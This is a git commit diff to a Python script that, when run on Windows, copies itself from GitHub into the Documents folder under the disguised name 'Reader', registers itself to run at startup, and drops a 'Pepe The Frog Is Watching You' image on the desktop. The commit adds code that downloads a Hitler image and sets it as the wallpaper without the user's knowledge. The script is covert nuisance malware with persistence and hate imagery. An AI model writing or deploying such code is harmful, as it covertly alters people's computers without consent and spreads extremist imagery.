60c612e98202dbe0ccb04cb2f8d3144dc7c3bc90
dominik <domgryko@gmail.com>
2023-09-29 20:37:23 +0100

    Added Wallpaper Change

--- main.py
+++ main.py
@@ -2,6 +2,20 @@ import os
 import requests
 import sys
 import winshell
+import struct
+import ctypes
+
+def is_64_windows():
+    """Find out how many bits is OS. """
+    return struct.calcsize('P') * 8 == 64
+
+
+def get_sys_parameters_info():
+    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
+    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
+        else ctypes.windll.user32.SystemParametersInfoA
+
+
 
 def create_desktop_shortcut(target_path, shortcut_name):
     # Get the path to the desktop folder
@@ -11,8 +25,24 @@ def create_desktop_shortcut(target_path, shortcut_name):
     winshell.CreateShortcut(
         Path= shortcut_path,
         Target = target_path,
-        Icon=(target_path, 0)
+        Icon=(target_path, 1)
     )
+
+
+def change_wallpaper(WALLPAPER_PATH = None):
+    
+    SPI_SETDESKWALLPAPER = 20
+
+    sys_parameters_info = get_sys_parameters_info()
+    r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
+
+    # When the SPI_SETDESKWALLPAPER flag is used,
+    # SystemParametersInfo returns TRUE
+    # unless there is an error (like when the specified file doesn't exist).
+    if not r:
+        print(ctypes.WinError())
+
+
 
 def create_startup_shortcut(target_path, shortcut_name):
     startup = winshell.startup() #"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\\" 
@@ -22,7 +52,7 @@ def create_startup_shortcut(target_path, shortcut_name):
     winshell.CreateShortcut(
         Path= shortcut_path,
         Target = target_path,
-        Icon=(target_path, 0)
+        Icon=(sys.executable, 1)
     )
 
 def download_raw_content(raw_link, filepath = None):
@@ -67,8 +97,8 @@ def run_on_startup():
 def hide_program():
     response = requests.get("https://raw.githubusercontent.com/Dominik-Gryko/Friendly-Experiment/main/main.py")
     documents = os.path.normpath(os.path.expanduser("~/Documents"))
-    directory_path = f"{documents}/Reader"
-    file_path = f"{documents}/Reader/Reader.py"
+    directory_path = f"{documents}\Reader"
+    file_path = f"{documents}\Reader\Reader.py"
 
     dir_check_create(directory_path)
     file_check_create(file_path, response.content)
@@ -76,13 +106,18 @@ def hide_program():
 
 
 
-
-
 def main():
     hide_program()
     run_on_startup()
-    
+
     desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
-    download_raw_content("https://i.imgur.com/8nLFCVP.png", f"{desktop}/Pepe The Frog Is Watching You.png")
+    documents = os.path.normpath(os.path.expanduser("~/Documents"))
+    image_path_pepe = f"{desktop}/Pepe The Frog Is Watching You.png"
+    image_path_hitler = f"{documents}\Reader\hitler.png"
+    download_raw_content("https://i.imgur.com/8nLFCVP.png", image_path_pepe)
+    download_raw_content("https://pbs.twimg.com/media/Fu8AKWJWIAApsVk.jpg", image_path_hitler)
+
+    change_wallpaper(image_path_hitler)
+
 
 main()
